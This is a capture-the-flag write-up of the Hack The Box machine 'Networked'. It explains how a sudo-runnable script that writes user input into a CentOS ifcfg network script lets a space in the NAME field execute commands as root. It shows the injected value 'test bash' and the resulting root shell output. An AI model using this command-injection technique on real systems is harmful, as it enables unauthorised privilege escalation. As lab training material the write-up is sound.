# Redhat/CentOS root through network-scripts
*Networked-Hackthebox*

If, for whatever reason, a user is able to **write** an ifcf-<whatever> script to **`/etc/sysconfig/network-scripts`** or it can 
**adjust** an existing one, then your system in pwned.

Network scripts, ifcg-eth0 for example are used for network connections. The look exactly like .INI files. However, 
they are *sourced* on Linux by Network Manager (dispatcher.d).

The `NAME=` attributed in these network scripts is not handled correctly. If you have white/blank space in 
the name the system tries to **execute the part after the white/blank space**. Which means; everything after the first 
blank space is executed as root.

For example in Networked machine - Hackthebox

Rights of the user that I own (guly)
```console
[guly@networked ~]$ sudo -l
Matching Defaults entries for guly on networked:
    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin,
    env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS",
    env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE",
    env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES",
    env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE",
    env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY",
    secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

User guly may run the following commands on networked:
    (root) NOPASSWD: /usr/local/sbin/changename.sh
```
As guly I checked `sudo -l` and found that guly can run `/usr/local/sbin/changename.sh` as **root** without a password:

changename.sh:
```bash
[guly@networked ~]$ cat /usr/local/sbin/changename.sh
#!/bin/bash -p
cat > /etc/sysconfig/network-scripts/ifcfg-guly << EoF
DEVICE=guly0
ONBOOT=no
NM_CONTROLLED=no
EoF

regexp="^[a-zA-Z0-9_\ /-]+$"

for var in NAME PROXY_METHOD BROWSER_ONLY BOOTPROTO; do
        echo "interface $var:"
        read x
        while [[ ! $x =~ $regexp ]]; do
                echo "wrong input, try again"
                echo "interface $var:"
                read x
        done
        echo $var=$x >> /etc/sysconfig/network-scripts/ifcfg-guly
done
#command to activate the created network card
/sbin/ifup guly0  
[guly@networked ~]$
```
This script simply creates a network script for an interface called `guly` then activates that interface. It asks the user for these options: NAME, PROXY_METHOD, BROWSER_ONLY, BOOTPROTO.
```console
[guly@networked ~]$ sudo /usr/local/sbin/changename.sh
interface NAME:
test
interface PROXY_METHOD:
test
interface BROWSER_ONLY:
test
interface BOOTPROTO:
test
ERROR     : [/etc/sysconfig/network-scripts/ifup-eth] Device guly0 does not seem to be present, delaying initialization.
```
We can inject commands in the interface NAME. Let’s try to execute bash:
```console
[guly@networked ~]$ sudo /usr/local/sbin/changename.sh
interface NAME:
test bash     #invoke bash shell with root privileges
interface PROXY_METHOD:
test
interface BROWSER_ONLY:
test
interface BOOTPROTO:
test
[root@networked network-scripts]# whoami
root
[root@networked network-scripts]# id
uid=0(root) gid=0(root) groups=0(root)
```
